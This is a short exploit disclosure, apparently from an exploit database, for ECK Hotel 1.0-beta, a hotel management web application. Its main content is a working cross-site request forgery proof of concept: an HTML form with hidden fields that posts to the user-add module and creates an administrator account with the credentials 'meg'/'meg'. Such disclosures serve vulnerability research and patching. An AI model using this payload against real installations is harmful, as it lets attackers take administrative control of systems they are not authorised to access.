@@ -1,0 +1,27 @@
+# Exploit Title : ECK Hotel 1.0 - Cross-Site Request Forgery (Add Admin)
+# Product : ECK Hotel
+# Version : 1.0-beta
+# Date: 2020-03-26
+# Software Download: https://sourceforge.net/projects/eckhotel/files/eck-hotel-v1.0-beta.zip/download
+# Exploit Author: Mustafa Emre Gül
+# Website: https://emregul.com.tr/
+# Tested On : Win10 x64
+# Description : Simple Hotel Management System.
+
+
+PoC:
+<!--Unauthenticated Create Admin User -->
+<html>
+  <body>
+      <form action="localhost/index.php?module=user/user-add" method="POST">
+      <input type="hidden" name="nama" value="meg" />
+      <input type="hidden" name="id_user_role" value="1" />
+      <input type="hidden" name="jabatan" value="meg" />
+      <input type="hidden" name="nomor_telp" value="1" />
+      <input type="hidden" name="username" value="meg" />
+      <input type="hidden" name="password" value="meg" />
+      <input type="hidden" name="user-add" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
